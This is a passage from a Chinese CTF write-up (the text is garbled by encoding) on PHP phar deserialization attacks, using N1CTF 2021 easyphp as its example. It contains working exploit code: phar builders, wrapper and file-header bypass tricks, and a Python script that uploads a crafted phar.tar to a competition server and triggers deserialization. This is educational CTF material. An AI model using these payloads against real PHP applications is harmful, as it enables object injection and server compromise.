href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf\">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p>\n<blockquote>\n<p>åˆ©ç”¨pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<strong>meta-data</strong>è¿™ä¸€ç‰¹æ€§ï¼Œæ‹“å±•äº†phpååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢ã€‚è¯¥æ–¹æ³•åœ¨<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</strong>ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ<strong>phar:&#x2F;&#x2F;ä¼ªåè®®</strong>ï¼Œ<strong>å¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</strong>ã€‚</p>\n</blockquote>\n<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ä¼ å…¥ä»¥ä¸‹å‡½æ•°çš„å‚æ•°ï¼Œå°±æœ‰æ½œåœ¨çš„pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å¯èƒ½ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/func.png\" loading=\"lazy\"></p>\n<p>è¿˜æœ‰ä¸€äº›åˆ«çš„å‡½æ•°å¯ç”¨ï¼Œå¯å‚è€ƒè¿™ç¯‡ï¼š<a href=\"https://www.freebuf.com/articles/web/205943.html\">https://www.freebuf.com/articles/web/205943.html</a></p>\n<p><strong>è¯•è¯•çœ‹ï¼Ÿ</strong></p>\n<p>æˆ‘ä»¬å…ˆæ¥ç”Ÿæˆä¸€ä¸ªpharï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestObject</span> </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;phar.phar&quot;</span>); <span class=\"comment\">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class=\"comment\">//è®¾ç½®stub</span></span><br><span class=\"line\">    <span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">TestObject</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>); <span class=\"comment\">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>); <span class=\"comment\">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class=\"line\">    <span class=\"comment\">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æ³¨æ„è¿™è¾¹$oååºåˆ—åŒ–åªä¼šä¿å­˜æ•°æ®ä¸ä¼šä¿å­˜æ–¹æ³•ã€‚æ‰§è¡Œå®Œæ¯•åï¼Œæˆ‘ä»¬æ¥è§‚å¯Ÿpharæ–‡ä»¶çš„å†…å®¹ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/hex.png\" loading=\"lazy\"></p>\n<p>GBMBç»“å°¾çš„ç­¾åä»¥åŠåºåˆ—åŒ–åçš„metadataæ¸…æ™°å¯è§ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestObject</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Destruct called&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"string\">&#x27;phar://phar.phar/test.txt&#x27;</span>;<span class=\"comment\">//æ—¢ç„¶æ˜¯å‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¦‚æ­¤è®¿é—®å…¶ä¸­çš„æŸä¸ªæ–‡ä»¶</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$filename</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>åœ¨ä¸Šé¢çš„ç¨‹åºæ‰§è¡Œä¹‹åï¼Œæˆ‘ä»¬ä¼šå‘ç°å®ƒè¾“å‡ºäº†â€œDestruct calledâ€.è¿™æ˜¯ç”±äºpharè¢«è§£æçš„æ—¶å€™ï¼Œmetadataè¢«ååºåˆ—åŒ–äº†ï¼Œäºæ˜¯è¯¥å®ä¾‹è¢«ææ„æ—¶è°ƒç”¨__destructå‡½æ•°ã€‚è¿™ä¾¿æ˜¯ååºåˆ—åŒ–æ¼æ´çš„æ¥ç”±ã€‚</p>\n<p>PHP â‰¥5.3é»˜è®¤æ”¯æŒpharæ–‡ä»¶ï¼›è€Œåœ¨PHP8ä¸­ï¼Œè¯¥æ¼æ´è¢«ä¿®å¤ï¼šmetadataä¸ä¼šè‡ªåŠ¨è¢«ååºåˆ—åŒ–äº†ã€‚ï¼ˆæ¥æºè¯·æ±‚ï¼‰</p>\n<hr>\n<h2 id=\"phar-æ˜¯ä»€ä¹ˆ\"><a href=\"#phar-æ˜¯ä»€ä¹ˆ\" class=\"headerlink\" title=\"phar:&#x2F;&#x2F;æ˜¯ä»€ä¹ˆ\"></a><strong>phar:&#x2F;&#x2F;æ˜¯ä»€ä¹ˆ</strong></h2><p>å‰é¢æåˆ°ï¼Œæˆ‘ä»¬è§£æpharæ–‡ä»¶å¸¸å¸¸ä½¿ç”¨phar:&#x2F;&#x2F;ä¼ªåè®®ã€‚CTFä¸­ï¼Œç”±äºä¼ªåè®®æä¾›äº†ä¸€ç³»åˆ—å¯¹äºæ–‡ä»¶çš„å°è£…åè®®ï¼Œä½¿å¾—å½“æºç¨‹åºæœ‰å¯æ§çš„æ–‡ä»¶åŒ…å«å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬æœ‰æœºä¼šåˆ©ç”¨è¿™äº›åè®®æ§åˆ¶å…¶è¿”å›å€¼æˆ–æ˜¯å®Œæˆä¸€äº›é¢„æ–™å¤–æ“ä½œï¼ˆä¾‹å¦‚ååºåˆ—åŒ–ï¼‰ã€‚ä½œä¸ºä¼ªåè®®çš„ä¸€ç§ï¼Œç”±äºpharæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å‹ç¼©æ–‡ä»¶ï¼Œæ‰€ä»¥phar:&#x2F;&#x2F;å’Œzip:&#x2F;&#x2F;å…¶å®æœ‰å¾ˆå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œéƒ½å¯ä»¥è®¿é—®å‹ç¼©åŒ…ä¸­çš„å­æ–‡ä»¶ï¼Œå¹¶ä¸”zip:&#x2F;&#x2F;éœ€è¦æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œphar:&#x2F;&#x2F;å¹¶ä¸éœ€è¦ã€‚ï¼ˆæ¥æºè¯·æ±‚ï¼‰</p>\n<hr>\n<h2 id=\"å°tricks\"><a href=\"#å°tricks\" class=\"headerlink\" title=\"å°tricks\"></a><strong>å°tricks</strong></h2><h3 id=\"ç»•è¿‡å‰ç¼€è¿‡æ»¤\"><a href=\"#ç»•è¿‡å‰ç¼€è¿‡æ»¤\" class=\"headerlink\" title=\"ç»•è¿‡å‰ç¼€è¿‡æ»¤\"></a>ç»•è¿‡å‰ç¼€è¿‡æ»¤</h3><p>é˜Ÿé‡Œå¸ˆå‚…çš„å‡ ä¸ªexampleå¯ä»¥ç±»æ¯”ä½¿ç”¨ï¼Œéƒ½æ˜¯åœ¨å‰ç¼€éphar:&#x2F;&#x2F;çš„æƒ…å†µä¸‹è°ƒç”¨äº†phar:&#x2F;&#x2F;</p>\n<p>compress.bzip2å’Œcompress.zlib</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$z</span> = <span class=\"string\">&#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$z</span> = <span class=\"string\">&#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$z</span>);</span><br></pre></td></tr></table></figure>\n\n<p>php:&#x2F;&#x2F;</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"ç®€å•çš„ç»•è¿‡\"><a href=\"#ç®€å•çš„ç»•è¿‡\" class=\"headerlink\" title=\"ç®€å•çš„ç»•è¿‡\"></a>ç®€å•çš„ç»•è¿‡</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨stubéƒ¨åˆ†å‰ç¼€ä»»æ„çš„ç‰¹æ€§ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> -&gt; <span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&#x27;GIF89a&#x27;</span>.<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class=\"comment\">//è®¾ç½® stubï¼Œå¢åŠ  gif æ–‡ä»¶å¤´</span></span><br></pre></td></tr></table></figure>\n\n<p>è¿™å¯ä»¥ç»•è¿‡ä¸€éƒ¨åˆ†å¯¹æ–‡ä»¶å¤´çš„æ£€æµ‹ã€‚</p>\n<hr>\n<h3 id=\"ç»•è¿‡å‰åè„æ•°æ®\"><a href=\"#ç»•è¿‡å‰åè„æ•°æ®\" class=\"headerlink\" title=\"ç»•è¿‡å‰åè„æ•°æ®\"></a>ç»•è¿‡å‰åè„æ•°æ®</h3><p>ç”±äºç­¾åéƒ¨åˆ†çš„å­˜åœ¨ï¼Œphpä¼šæ ¡éªŒæ–‡ä»¶å“ˆå¸Œå€¼ï¼Œå¹¶æ£€æŸ¥æœ«å°¾æ˜¯å¦ä¸ºGBMBï¼Œå¦‚ä¸‹æ˜¯è§£æéƒ¨åˆ†çš„æºç ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/src.png\" loading=\"lazy\"></p>\n<p><a href=\"https://github.dev/php/php-src\">https://github.dev/php/php-src</a></p>\n<p>å¯è§ï¼Œå¦‚æœæœ«å°¾ä¸æ˜¯GBMBä¼šç›´æ¥å¯¼è‡´è§£æå¤±è´¥ã€‚</p>\n<p>åœ¨CTFä¸­åˆ©ç”¨è¯¥æ¼æ´éœ€è¦æˆ‘ä»¬å®Œæˆå†™å…¥&#x2F;ä¸Šä¼ pharï¼Œå¹¶è°ƒç”¨æ–‡ä»¶åŒ…å«å‡½æ•°ã€‚æˆ‘ä»¬çŸ¥é“ä¸€å¥è¯æœ¨é©¬ç”±äºæœ‰<code>&lt;?php ?&gt;</code>è¿™æ ·çš„å¤´å°¾æ ‡è¯†å­˜åœ¨ï¼Œå¯ä»¥æ— è§†å‰åè„æ•°æ®ï¼›ç„¶è€Œå¯¹äºpharï¼Œè¿™æ ·çš„éªšæ“ä½œè¢«ç­¾åéƒ¨åˆ†é˜»æ­¢äº†ã€‚æœ‰åŠæ³•ç»•è¿‡å—ï¼Ÿè¯·å‚é˜…ï¼š<a href=\"https://www.php.net/manual/zh/phar.converttoexecutable.php\">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p>\n<p>åˆ©ç”¨convertToExecutableå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpharæ–‡ä»¶è½¬ä¸ºå…¶ä»–æ ¼å¼çš„pharæ–‡ä»¶ï¼Œä¾‹å¦‚.tarå’Œ.zipæ ¼å¼ã€‚</p>\n<p>æˆ‘ä»¬ä»¥N1CTF easyphpä¸ºä¾‹å­ï¼Œè¿™é¢˜å…è®¸æˆ‘ä»¬å†™å…¥æ—¥å¿—ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨pharååºåˆ—åŒ–å¾—åˆ°flagï¼Œéš¾ç‚¹åœ¨äºæ—¥å¿—æ–‡ä»¶å‰åæœ‰é¢å¤–è„æ•°æ®ï¼Œä¼šä½¿å¾—æˆ‘ä»¬çš„pharæ–‡ä»¶æ— æ³•è¢«è§£æã€‚</p>\n<p>ç„¶è€Œå¦‚æœä»¥taræ ¼å¼å‚¨å­˜pharï¼Œæœ«å°¾çš„è„æ•°æ®å¹¶ä¸ä¼šå½±å“è§£æï¼ˆè¿™æ˜¯tarçš„æ ¼å¼å†³å®šçš„ï¼‰ï¼Œè€Œå¼€å¤´çš„è„æ•°æ®å¯ä»¥åœ¨åˆ¶é€ pharæ–‡ä»¶æ—¶å°±æå‰æ„é€ å¥½ï¼ˆè¿™æ ·è¿™éƒ¨åˆ†æ•°æ®ä¹Ÿä¼šè¢«çº³å…¥ç­¾åè®¡ç®—ï¼‰ï¼Œå†™å…¥æ—¥å¿—æ—¶ä¸å¿…å†™å…¥è¿™éƒ¨åˆ†ï¼Œè€Œæ˜¯ä»¤å…¶ä¸è„æ•°æ®æ‹¼æ¥å½¢æˆåˆæ³•çš„pharã€‚exploitå¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  CLASS FLAG &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;FLAG: &quot;</span> . <span class=\"variable language_\">$this</span>-&gt;_flag;</span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$sb</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sb&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$ts</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ts&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"variable\">$sb</span>.<span class=\"string\">&quot;.phar&quot;</span>); <span class=\"comment\">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class=\"line\">    **<span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>); <span class=\"comment\">//ä¼šç”Ÿæˆ*.phar.tar**</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;Time: &quot;</span>.<span class=\"variable\">$ts</span>.<span class=\"string\">&quot; IP: [], REQUEST: [log_type=&quot;</span>.<span class=\"variable\">$sb</span>.<span class=\"string\">&quot;], CONTENT: [&quot;</span>, <span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class=\"line\">    <span class=\"comment\">//taræ–‡ä»¶å¼€å¤´æ˜¯ç¬¬ä¸€ä¸ªæ·»åŠ æ–‡ä»¶çš„çš„æ–‡ä»¶åï¼Œæ³¨æ„æ·»åŠ çš„æ–‡ä»¶é¡ºåºä¸è¦é”™äº†</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class=\"comment\">//è®¾ç½®stub</span></span><br><span class=\"line\">    <span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">FLAG</span>();</span><br><span class=\"line\">  <span class=\"variable\">$o</span> -&gt; data = <span class=\"string\">&#x27;g0dsp3ed_1s_g0D&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>); <span class=\"comment\">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class=\"line\">    <span class=\"comment\">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æŠŠè¿™ä¸ªè·‘åœ¨æœ¬åœ°webæœåŠ¡ä¸Šï¼Œç„¶åå†™ä¸ªè„šæœ¬ï¼ˆå½“æ—¶åŠå¤œèµ¶åˆ¶çš„å¾ˆä¸‘ä¼šç•™ä¸‹ä¸€äº›åƒåœ¾æ–‡ä»¶ æ±‚è½»å–· é˜Ÿé‡Œå¸ˆå‚…å†™çš„å¹²å‡€å¤šäº†ï¼‰ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> rq</span><br><span class=\"line\"><span class=\"keyword\">import</span> json </span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\">ip = <span class=\"string\">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_random_str</span>(<span class=\"params\">randomlength=<span class=\"number\">16</span></span>):</span><br><span class=\"line\">  <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">  ç”Ÿæˆä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„éšæœºå­—ç¬¦ä¸²</span></span><br><span class=\"line\"><span class=\"string\">  &quot;&quot;&quot;</span></span><br><span class=\"line\">  random_str = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">  base_str = <span class=\"string\">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class=\"line\">  length = <span class=\"built_in\">len</span>(base_str) - <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(randomlength):</span><br><span class=\"line\">    random_str += base_str[random.randint(<span class=\"number\">0</span>, length)]</span><br><span class=\"line\">  <span class=\"keyword\">return</span> random_str</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_one</span>(<span class=\"params\">offset</span>):</span><br><span class=\"line\">    rd = generate_random_str(<span class=\"number\">4</span>)</span><br><span class=\"line\">    ts2 = time.strftime(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()+offset))</span><br><span class=\"line\">    ts = time.strftime(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class=\"line\">    res = rq.get(url=<span class=\"string\">f&quot;http://127.0.0.1/test.php?sb=<span class=\"subst\">&#123;rd&#125;</span>&amp;ts=<span class=\"subst\">&#123;ts2&#125;</span>&quot;</span>)  <span class=\"comment\"># è®¿é—®æœ¬åœ°ç”Ÿæˆphar</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">f&#x27;<span class=\"subst\">&#123;rd&#125;</span>.phar.tar&#x27;</span>,<span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f: </span><br><span class=\"line\">        data = f.read()</span><br><span class=\"line\">    data = data[<span class=\"number\">70</span>::]<span class=\"comment\">#å»æ‰å‰é¢çš„å†—ä½™éƒ¨åˆ†ä»¥ä¾¿å’Œlogå‰é¢æ‹¼æ¥å½¢æˆåˆæ³•*.phar.tar</span></span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;content-type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form&#x27;</span>&#125;  <span class=\"comment\"># æºæ–‡æœ¬</span></span><br><span class=\"line\">    res = rq.post(url=<span class=\"string\">f&quot;http://43.155.59.185:53340/log.php?log_type=<span class=\"subst\">&#123;rd&#125;</span>&quot;</span>,data=data)  <span class=\"comment\"># å†™å…¥æ—¥å¿—</span></span><br><span class=\"line\">    res = rq.post(url=<span class=\"string\">f&quot;http://43.155.59.185:53340?file=phar://./log/<span class=\"subst\">&#123;ip&#125;</span>/<span class=\"subst\">&#123;rd&#125;</span>_www.log&quot;</span>)  <span class=\"comment\"># ååºåˆ—åŒ–</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(res.text)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">30</span>,<span class=\"number\">30</span>):<span class=\"comment\">#è€ƒè™‘æœ¬åœ°å’Œè¿œç¨‹çš„æ—¶é—´å·®å¼‚ï¼Œè¿™è¾¹è®¾ç½®ä¸ª30sçš„çª—å£æœŸ</span></span><br><span class=\"line\">    new_one(i)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.9</span>)</span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;ç”Ÿæˆçš„æ–‡ä»¶é•¿è¿™æ ·ï¼ˆçœ‹ä¸ªå¼€å¤´å°±è¡Œï¼‰</span></span><br><span class=\"line\"><span class=\"string\">00000000: 5469 6d65 3a20 3230 3231 2d31 312d 3232  Time: 2021-11-22</span></span><br><span class=\"line\"><span class=\"string\">00000010: 2030 363a 3533 3a31 3520 4950 3a20 5b5d   06:53:15 IP: []</span></span><br><span class=\"line\"><span class=\"string\">00000020: 2c20 5245 5155 4553 543a 205b 5d2c 2043  , REQUEST: [], C</span></span><br><span class=\"line\"><span class=\"string\">00000030: 4f4e 5445 4e54 3a20 5b5f 5f5f 5f5f 5f5f  ONTENT: [_______</span></span><br><span class=\"line\"><span class=\"string\">00000040: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class=\"line\"><span class=\"string\">00000050: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class=\"line\"><span class=\"string\">00000060: 5f5f 5f5f 3030 3030 3634 3400 0000 0000  ____0000644.....</span></span><br><span class=\"line\"><span class=\"string\">00000070: 0000 0000 0000 0000 0000 0000 3030 3030  ............0000</span></span><br><span class=\"line\"><span class=\"string\">00000080: 3030 3030 3032 3400 3134 3134 3636 3337  0000024.14146637</span></span><br><span class=\"line\"><span class=\"string\">00000090: 3133 3300 3030 3233 3534 3320 3000 0000  133.0023543 0...</span></span><br><span class=\"line\"><span class=\"string\">000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>ä¸åªæ˜¯tarï¼Œè¿˜æœ‰åˆ«çš„æ ¼å¼ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/targz.png\" loading=\"lazy\"><br><a 